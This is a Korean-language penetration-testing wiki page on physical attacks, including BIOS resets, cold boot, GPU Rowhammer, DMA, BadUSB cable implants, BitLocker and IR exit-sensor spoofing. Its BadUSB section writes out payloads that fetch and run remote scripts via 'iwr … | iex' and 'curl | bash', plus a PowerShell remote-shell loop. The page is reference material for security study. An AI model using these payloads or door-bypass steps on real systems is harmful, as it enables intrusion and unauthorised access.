# 물리적 공격

{{#include ../banners/hacktricks-training.md}}

## BIOS 비밀번호 복구 및 시스템 보안

레거시 PC 펌웨어 설정은 CMOS 배터리를 분리하거나 문서화된 Clear-CMOS 점퍼를 사용해 초기화할 수 있습니다. 필요한 전원 차단 시간은 보드마다 다르며, 최신 UEFI 비밀번호나 키는 비휘발성 플래시, 임베디드 컨트롤러 또는 보안 장치에 저장될 수 있어 배터리를 분리해도 유지될 수 있습니다. 핀을 단락하기 전에 보드/서비스 매뉴얼을 확인하세요. 이 절차로 TPM 측정값이 무효화되고 디스크 암호화 복구가 시작될 수도 있습니다.

레거시 x86 시스템에서는 **killCMOS** 및 **CmosPwd**와 같은 도구를 부팅 가능한 환경에서 사용해 CMOS 기반 설정을 확인하거나 변경할 수 있습니다. CmosPwd는 문서화된 일부 구형 BIOS 제품군의 비밀번호 형식을 인식하며, CMOS 상태를 백업, 복원 또는 삭제/초기화할 수 있습니다. 공개된 빌드는 레거시 DOS/Windows, Linux, FreeBSD 및 NetBSD 환경을 대상으로 합니다.<sup>[[18]](#references)</sup> 이러한 유틸리티는 범용 UEFI 비밀번호 제거 도구가 아니며, 충분한 하드웨어/펌웨어 접근 권한이 필요합니다.

일부 노트북 펌웨어는 비밀번호 입력에 여러 번 실패하면 제조사별 챌린지 코드를 표시합니다. [bios-pw.org](https://bios-pw.org) 같은 데이터베이스는 일부 모델에서 레거시 제조사 복구 비밀번호를 생성할 수 있지만, 많은 시스템은 복구 가능한 챌린지 없이 잠금 기능을 구현합니다. 생성된 비밀번호는 모델별로 다르다고 간주하고, 영구 시도 횟수를 모두 소진하지 않도록 주의하세요.

### UEFI 보안

최신 **UEFI** 시스템에서는 CHIPSEC을 사용해 Secure Boot 변수 보호를 감사할 수 있습니다. 먼저 아래의 비변경 검사를 실행하세요. 선택 사항인 `-a modify` 모드는 의도적으로 변수 손상을 시도하므로 복구 가능한 실험실 시스템에서만 사용해야 합니다. CHIPSEC 자체도 권한이 필요한 드라이버와 저수준 하드웨어 접근 기능은 운영 환경의 엔드포인트에 적합하지 않다고 경고합니다.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM 분석 및 콜드 부트 공격

DRAM은 refresh가 중단되어도 모든 비트가 즉시 손실되지는 않습니다. 데이터 감쇠 속도는 모듈 기술과 온도에 따라 크게 달라지며, 냉각하면 전원을 끈 상태보다 훨씬 오래 유용한 데이터를 보존할 수 있습니다. cold-boot attack은 빠르게 재부팅해 최소한의 데이터 수집 환경으로 진입하거나 냉각된 모듈을 옮긴 뒤, raw memory를 캡처하고 비트 감쇠에도 불구하고 암호화 키를 복원합니다. 디스크 복사 유틸리티가 자동으로 물리 메모리 이미징 도구가 되는 것은 아니며, Volatility는 캡처를 분석하는 도구이지 데이터를 수집하는 도구가 아닙니다. 플랫폼에 적합하고 검증된 데이터 수집 도구를 사용하세요.<sup>[[12]](#references)</sup>

---

## 페이지 테이블을 대상으로 하는 GPU Rowhammer

최신 GPU Rowhammer 공격은 일반 버퍼 대신 **GPU 가상 메모리 메타데이터**를 대상으로 할 때 훨씬 유용해집니다. **GDDR6 NVIDIA Ampere GPU**를 대상으로 한 최근 연구에 따르면, 권한이 없는 CUDA 코드를 실행하는 공격자는 GPU에 특화된 해머링 패턴을 만들고, **memory massaging**으로 취약한 행에 페이징 구조를 배치한 다음, **마지막 단계 페이지 테이블**이나 중간 **페이지 디렉터리**의 비트를 뒤집을 수 있습니다. 단 하나의 주소 변환 항목이 손상되면 공격자는 이를 발판으로 **임의의 GPU 메모리 읽기/쓰기**를 수행한 뒤 호스트 침해로 이어갈 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

### 악용 패턴

1. GDDR6에서 **해머링 가능한 행을 프로파일링**하고, DRAM 내부 완화책을 우회하는 refresh-aware / non-uniform 해머링 패턴을 만듭니다.
2. 드라이버가 페이지 변환 구조를 기본 보호 풀에 두지 않고 해머링 가능한 물리 위치에 배치하도록 **GPU 할당을 조정**합니다. 실제로는 저메모리 페이지 테이블 영역을 고갈시키고, 제어된 stride로 대규모 sparse UVM 매핑을 분산 배치할 수 있습니다.
3. 페이지 테이블 또는 페이지 디렉터리 항목 내의 **PFN**이나 aperture 관련 비트 같은 **주소 변환 메타데이터**를 뒤집어, 공격자가 제어하는 가상 페이지가 페이지 테이블 페이지, 임의의 GPU 메모리 또는 호스트에서 볼 수 있는 시스템 매핑으로 연결되게 합니다.
4. 위조된 매핑을 재사용해 추가 주소 변환 항목을 덮어쓰고, GPU 컨텍스트 전반에서 **임의의 GPU 메모리 읽기/쓰기**로 권한을 확대합니다.

### 호스트로의 전환 및 완화책

- **IOMMU가 비활성화된 경우**, 위조된 system-aperture 매핑으로 GPU가 임의의 **호스트 물리 메모리**에 접근할 수 있어 GPU 원시 기능이 호스트 전체 침해로 이어집니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer**는 마지막 단계 페이지 테이블 항목을 대상으로 합니다. 반면 **GeForge**는 페이지 디렉터리 수준을 손상시키는 편이 더 쉬울 수 있음을 보여줍니다. 비트 하나를 뒤집어도 더 큰 주소 변환 하위 트리를 다른 대상으로 지정할 수 있기 때문입니다. 페이징 계층 하나만 보안상 중요하다고 간주하지 마세요.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU**는 GDDRHammer/GeForge가 사용하는 직접적인 임의 호스트 메모리 접근 경로를 차단하므로 여전히 중요하지만, **완전한 완화책은 아닙니다**. **GPUBreach**는 공격자가 GPU에서 쓸 수 있는 드라이버 소유 CPU 버퍼를 손상시킨 다음 NVIDIA 드라이버의 메모리 안전성 버그를 유발해 커널 쓰기 원시 기능과 **root shell**을 얻는 2단계 전환을 보여줍니다. 이 공격은 IOMMU가 활성화되어 있어도 가능합니다.<sup>[[3]](#references)</sup>
- 지원되는 워크스테이션/서버 GPU에서는 **시스템 수준 ECC**가 실용적인 보안 강화책입니다. ECC가 없는 소비자용 GPU는 방어 여지가 더 적습니다.<sup>[[4]](#references)</sup>
- 이 공격은 순전히 이론적인 것이 아닙니다. **GeForge**는 RTX 3060에서 **1,171**회, RTX A6000에서 **202**회의 비트 플립을 보고했으며, 이는 호스트 권한 상승 체인을 구현하기에 충분했습니다.<sup>[[2]](#references)[[9]](#references)</sup>

---

## DMA(Direct Memory Access) 공격

부팅 전 IOMMU 적용을 낮추고 Windows DMA 체인을 가능하게 할 수 있는 오프라인 UEFI IFR/NVRAM 패치 방법은 다음을 참고하세요.

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception**은 FireWire 및 초기 Thunderbolt 구성과 같은 인터페이스를 통한 **DMA 기반 메모리 수집 및 패치**를 보여주며, 과거의 로그인 우회 시그니처도 포함합니다. 이는 단순히 “Windows 10에서는 효과가 없는” 공격이 아닙니다. 악용 가능성은 인터페이스, 대상 빌드, IOMMU 정책, 잠금 상태, Windows Kernel DMA Protection의 지원 및 활성화 여부에 따라 달라집니다. Windows 10 버전 1803 이상에서는 호환 플랫폼에 Kernel DMA Protection이 도입되어 공격 표면이 크게 달라졌습니다.<sup>[[13]](#references)[[14]](#references)</sup>

---

## 시스템 접근을 위한 Live CD/USB

암호화되지 않았거나 이미 잠금 해제된 Windows 볼륨에서는 오프라인 환경을 이용해 **sethc.exe** 또는 **Utilman.exe**와 같은 접근성 바이너리를 **cmd.exe**로 교체할 수 있습니다. 그러면 해당 로그인 화면 바로 가기를 실행할 때 SYSTEM 명령 프롬프트가 열립니다. **chntpw**와 같은 도구로 로컬 SAM 계정 데이터를 편집할 수도 있습니다. 이 방법은 잠긴 BitLocker 볼륨을 우회하지 못하며 DPAPI/EFS로 보호된 자격 증명을 손상시킬 수 있습니다. 포렌식 사본과 백업을 보존하세요.

**Kon-Boot**는 지원되는 Windows/macOS 구성에서 부팅 시 인증을 우회하는 상용 도구입니다. 호환성은 OS, 펌웨어 모드, Secure Boot 및 디스크 암호화 설정에 따라 달라지며, BitLocker로 잠긴 볼륨을 복호화하지는 않습니다.<sup>[[10]](#references)</sup>

---

## Windows 보안 기능 다루기

### 부팅 및 복구 바로 가기

- **Delete/Supr**, F2, F10 또는 다른 제조업체별 키를 누르면 펌웨어 설정을 열 수 있습니다.
- **F8**은 해당 경로가 활성화된 구성에서만 기존 Windows 고급 부팅 옵션으로 진입합니다. 현재는 복구 진입 방법이 구성에 따라 다릅니다.
- **Shift**를 누르고 있으면 일부 구성에서 Windows 자동 로그온을 억제할 수 있지만, 정책/레지스트리 설정으로 이 동작을 비활성화할 수 있습니다.<sup>[[17]](#references)</sup>

### BAD USB 기기

**USB Rubber Ducky** 및 Teensy 보드와 같은 기기는 신뢰된 HID 키보드로 인식되어 사전 정의된 키 입력을 주입할 수 있습니다. 페이로드는 처음에 로그인된 세션과 동일한 권한 및 데스크톱 접근 권한을 가집니다. UAC 프롬프트, 화면 잠금, 키보드 레이아웃, 타이밍 및 엔드포인트 USB 정책은 여전히 제약 요인입니다.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

관리자 또는 백업 권한이 있으면 shadow copy를 만들거나 레지스트리 하이브를 저장해 **SAM** 및 **SYSTEM** 같은 잠긴 파일을 수집할 수 있습니다. 이는 침해 후 데이터 수집 기법이지 권한 우회 기법이 아닙니다. `diskshadow`/VSS 및 레지스트리 하이브 내보내기 이벤트와 대조해 확인해야 합니다.

## BadUSB / HID implant 기법

### Wi-Fi 관리 케이블 임플란트

- **Evil Crow Cable Wind**와 같은 ESP32-S3 기반 임플란트는 USB-A→USB-C 또는 USB-C↔USB-C 케이블 안에 숨겨져 순수한 USB 키보드로 인식되고, Wi-Fi를 통해 C2 스택에 접근할 수 있습니다. 운영자는 피해자 호스트에서 케이블에 전원만 공급한 뒤, 비밀번호 `123456789`를 사용해 `Evil Crow Cable Wind`라는 핫스팟을 만들고 [http://cable-wind.local/](http://cable-wind.local/) (또는 DHCP 주소)로 접속해 내장 HTTP 인터페이스에 접근하면 됩니다.<sup>[[8]](#references)</sup>
- 브라우저 UI에는 *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, *Config* 탭이 있습니다. 저장된 페이로드에는 OS별 태그가 붙고, 키보드 레이아웃은 실행 중에 전환되며, VID/PID 문자열을 변경해 알려진 주변 기기를 흉내 낼 수 있습니다.
- C2가 케이블 내부에 있으므로, 조직의 네트워크를 사용하지 않고도 휴대폰으로 페이로드를 준비하고 실행을 트리거하며 Wi-Fi 자격 증명을 관리할 수 있습니다. 이는 물리 침입 체류 시간이 짧을 때 유용합니다.

### OS 인식 AutoExec 페이로드

- AutoExec 규칙은 USB가 인식된 직후 하나 이상의 페이로드를 실행하도록 설정합니다. 임플란트는 간단한 OS 핑거프린팅을 수행한 다음 일치하는 스크립트를 선택합니다.
- 예시 워크플로:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) 또는 `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- 실행이 자동으로 이루어지므로 충전 케이블만 바꿔 꽂아도 로그인된 사용자 컨텍스트에서 “plug-and-pwn” 초기 접근을 확보할 수 있습니다.

### Wi-Fi TCP를 통한 HID 부트스트랩 원격 셸

1. **키 입력 부트스트랩:** 저장된 페이로드가 콘솔을 열고 새 USB serial 장치로 수신되는 내용을 실행하는 루프를 붙여 넣습니다. 최소한의 Windows 예시는 다음과 같습니다.

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** 임플란트는 USB CDC 채널을 열린 상태로 유지하는 동안 ESP32-S3가 운영자에게 연결하는 TCP 클라이언트(Python 스크립트, Android APK 또는 데스크톱 실행 파일)를 실행합니다. TCP 세션에 입력된 모든 바이트는 위의 serial loop로 전달되어, air-gapped 호스트에서도 원격 명령 실행이 가능합니다. 출력은 제한적이므로 운영자는 일반적으로 blind command(계정 생성, 추가 도구 스테이징 등)를 실행합니다.

### HTTP OTA 업데이트 공격 표면

- 문서화된 Evil Crow Cable Wind 인터페이스는 `/update`에서 인증 없이 접근 가능한 펌웨어 업데이트 엔드포인트를 노출합니다:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- 현장 작업자는 engagement 중에도 케이블을 열지 않고 기능을 핫스왑할 수 있습니다(예: USB Army Knife firmware 플래시). 따라서 implant는 대상 호스트에 계속 연결된 상태에서 새로운 기능으로 전환할 수 있습니다.

## BitLocker Encryption 우회

실행 중이거나 최근에 실행된 시스템을 대상으로 승인된 forensic acquisition을 수행하면 볼륨이 잠금 해제된 동안 BitLocker 볼륨 마스터 키 또는 관련 키 자료가 포함될 수 있습니다. Elcomsoft Forensic Disk Decryptor 및 Passware Kit Forensic과 같은 상용 도구는 지원되는 메모리 이미지, 최대 절전 모드 파일 또는 크래시 덤프를 검색할 수 있지만, 반드시 성공하는 것은 아닙니다. BitLocker가 활성화된 경우 최신 Windows는 크래시 덤프도 암호화하며, 저장된 48자리 복구 암호는 메모리에 있는 볼륨 키와는 다른 아티팩트입니다.<sup>[[12]](#references)[[16]](#references)</sup>

---

## 복구 키 추가를 위한 Social Engineering

공격자는 관리자에게 BitLocker 관리 명령을 실행하도록 설득해 복구 암호, 외부 키 또는 다른 protector를 추가한 다음 이를 확보할 수 있습니다. 복구 암호는 0으로만 된 임의의 문자열일 수 없습니다. BitLocker 숫자 복구 암호는 검증된 48자리 형식을 따라야 합니다. 관련된 승인된 관리 명령 구문은 `manage-bde -protectors -add C: -recoverypassword`입니다. 추가된 protector를 확인하려면 `manage-bde -protectors -get C:`를 실행합니다. protector 추가를 모니터링하고 새로운 복구 자료는 승인된 위치에만 보관되도록 하세요.<sup>[[16]](#references)</sup>

---

## Chassis Intrusion / Maintenance Switch를 악용한 BIOS 초기화

최신 노트북과 소형 데스크톱 중 상당수에는 Embedded Controller(EC)와 BIOS/UEFI firmware가 감시하는 **chassis-intrusion switch**가 있습니다. 이 스위치는 장치가 열릴 때 경고를 발생시키는 것이 주된 목적이지만, 제조업체가 특정 패턴으로 스위치를 전환할 때 작동하는 **문서화되지 않은 복구 단축 동작**을 구현한 경우도 있습니다.<sup>[[5]](#references)[[6]](#references)</sup>

### 공격 방식

1. 스위치는 EC의 **GPIO interrupt**에 연결됩니다.
2. EC에서 실행되는 firmware는 **누른 횟수와 시간 간격**을 추적합니다.
3. 하드코딩된 패턴이 인식되면 EC는 *mainboard-reset* 루틴을 호출하여 **시스템 NVRAM/CMOS의 내용을 지웁니다**.
4. 다음 부팅 시 해당 모델은 초기화된 firmware 상태를 불러옵니다. 제조업체와 revision에 따라 지워지는 항목에는 supervisor password, 사용자 지정 부팅 설정 또는 등록된 Secure Boot 키가 포함될 수 있습니다. TPM 상태와 디스크 암호화에 미치는 영향은 별도로 평가해야 합니다.

> firmware를 초기화하면 외부 부팅 옵션이 복원될 수 있지만, **저장 장치의 암호가 해제되지는 않습니다**. TPM/firmware 변경 후 BitLocker 또는 다른 전체 디스크 암호화 시스템이 복구 모드로 전환될 수 있으며, 복구 키가 없으면 내부 드라이브는 계속 보호됩니다.<sup>[[16]](#references)</sup>

### 실제 사례 – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen)의 복구 단축 동작은 다음과 같습니다:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

10번째 사이클 후 EC는 다음 재부팅 때 BIOS가 NVRAM을 지우도록 지시하는 플래그를 설정합니다. 전체 절차는 약 40초가 걸리며 **드라이버 외에는 아무것도 필요하지 않습니다**.<sup>[[5]](#references)</sup>

### 일반적인 Exploitation 절차

1. EC가 실행 중이 되도록 대상을 켜거나 절전 모드에서 복귀시킵니다.
2. 하단 커버를 분리해 침입/유지보수 스위치를 노출시킵니다.
3. 제조사별 토글 패턴을 재현합니다(문서나 포럼을 참고하거나 EC 펌웨어를 리버스 엔지니어링합니다).
4. 다시 조립하고 재부팅한 다음 실제로 변경된 펌웨어 설정과 자격 증명을 확인합니다.
5. 승인을 받았고 외부 부팅이 가능하다면, 통제된 live image로 부팅합니다. 내부 볼륨이 정당한 절차로 잠금 해제된 경우(또는 애초에 암호화되지 않은 경우), live 환경에서 자격 증명과 데이터를 확보하거나 EFI System Partition을 검사할 수 있습니다. 해당 파티션을 수정해 EFI implant를 설치하는 것은 지속적이고 매우 침해적인 행위이며, Secure Boot, measured boot, 펌웨어 쓰기 방지 및 endpoint monitoring의 제약을 받습니다. 암호화된 저장소는 키나 복구 자료 없이는 접근할 수 없습니다.

### 탐지 및 완화

* OS 관리 콘솔에 섀시 침입 이벤트를 기록하고, 예상치 못한 BIOS 재설정과 연관 지어 확인합니다.
* 개봉 여부를 감지할 수 있도록 나사와 커버에 **훼손 확인용 봉인**을 사용합니다.
* 장치를 **물리적으로 통제되는 구역**에 보관합니다. 물리적 접근은 완전한 침해와 같다고 가정합니다.
* 가능한 경우 제조사의 “maintenance switch reset” 기능을 비활성화하거나, NVRAM 재설정에 추가적인 암호화 인증을 요구합니다.

---

## 비접촉식 출구 센서에 대한 은밀한 IR 주입

### 센서 특성
- 일반적인 “손을 흔들어 나가기” 센서는 근적외선 LED 발광부와 TV 리모컨 방식의 수신기 모듈을 사용합니다. 이 수신기는 올바른 반송파(약 30 kHz)의 펄스를 여러 번(약 4~10회) 감지한 뒤에만 논리 high를 출력합니다.<sup>[[7]](#references)</sup>
- 플라스틱 차폐물이 발광부와 수신기가 서로를 직접 바라보지 못하게 하므로, 컨트롤러는 검증된 반송파가 근처 물체에 반사되어 들어왔다고 간주하고 도어 스트라이크를 여는 릴레이를 작동시킵니다.
- 컨트롤러가 대상이 있다고 판단하면 출력 변조 포락선을 변경하는 경우가 많지만, 수신기는 필터링된 반송파와 일치하는 버스트를 계속 받아들입니다.

### 공격 절차
1. **방출 프로파일 캡처** – 컨트롤러 핀에 로직 애널라이저를 연결해 내부 IR LED를 구동하는 감지 전과 감지 후의 파형을 모두 기록합니다.
2. **“감지 후” 파형만 재생** – 기본 발광부를 제거하거나 무시하고, 이미 트리거된 패턴을 처음부터 외부 IR LED로 송신합니다. 수신기는 펄스 수와 주파수만 확인하므로, 위조된 반송파를 실제 반사 신호로 간주하고 릴레이 라인을 활성화합니다.
3. **송신 제어** – 조정된 버스트(예: 수십 밀리초 켜짐, 비슷한 시간 꺼짐)로 반송파를 송신해, 수신기의 AGC나 간섭 처리 로직을 포화시키지 않으면서 필요한 최소 펄스 수를 전달합니다. 연속 송신하면 센서의 감도가 빠르게 떨어져 릴레이가 작동하지 않습니다.

### 장거리 반사 주입
- 실험용 LED를 고출력 IR 다이오드, MOSFET 드라이버 및 집광 광학 장치로 교체하면 약 6 m 거리에서도 안정적으로 트리거할 수 있습니다.
- 공격자는 수신기 개구부를 직접 바라볼 필요가 없습니다. 유리 너머로 보이는 실내 벽, 선반 또는 문틀에 빔을 조준하면 반사 에너지가 약 30° 시야각 안으로 들어가 근거리에서 손을 흔드는 동작을 모방합니다.
- 수신기는 약한 반사만을 예상하므로, 훨씬 강한 외부 빔도 여러 표면에서 반사된 뒤 탐지 임계값을 초과할 수 있습니다.

### 무기화된 공격용 손전등
- 드라이버를 상용 손전등 내부에 넣으면 도구를 눈에 띄지 않게 숨길 수 있습니다. 가시광 LED를 수신기 대역에 맞는 고출력 IR LED로 바꾸고, ATtiny412(또는 유사한 MCU)로 약 30 kHz 버스트를 생성하며 MOSFET으로 LED 전류를 흘려 보냅니다.
- 텔레스코픽 줌 렌즈는 장거리 및 정밀 조준을 위해 빔을 좁히고, MCU로 제어되는 진동 모터는 가시광을 내지 않고 변조가 작동 중임을 촉각으로 알려줍니다.
- 여러 변조 패턴(반송파 주파수와 포락선이 조금씩 다름)을 순환하면 재브랜딩된 여러 센서 제품군과의 호환성이 높아집니다. 그러면 작업자는 반사면을 차례로 겨냥해 릴레이가 딸깍 소리를 내고 문이 열릴 때까지 확인할 수 있습니다.

---

## References

- [1] [GDDRHammer: 최신 GPU에서 발생하는 교차 구성요소 Rowhammer 공격으로 DRAM 행을 크게 교란하기](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: 재미와 이익을 위해 GDDR 메모리를 해머링하여 GPU 페이지 테이블 위조하기](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammer를 이용한 GPU 권한 상승 공격](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - 보안 공지: Rowhammer - 2025년 7월](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. 여기를 눌러 pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – 메인보드 재설정 가이드](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “손대지 마세요! – 은밀한 IR 손전등으로 IR 비접촉식 출구 센서 우회하기”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “연결하고, 실행하고, pwn하기: Evil Crow Cable Wind를 이용한 해킹”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIA 칩에 대한 Rowhammer 공격](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot 공식 문서 및 호환성 정보](https://kon-boot.com/)
- [11] [CHIPSEC 문서 - Secure Boot 변수 보호](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [기억하지 못하게 하라: 암호화 키에 대한 콜드 부트 공격](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMA를 통한 물리 메모리 조작](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky 문서](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker 운영 가이드](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shift 키 누르기와 자동 로그온 동작](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd 문서 및 다운로드](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
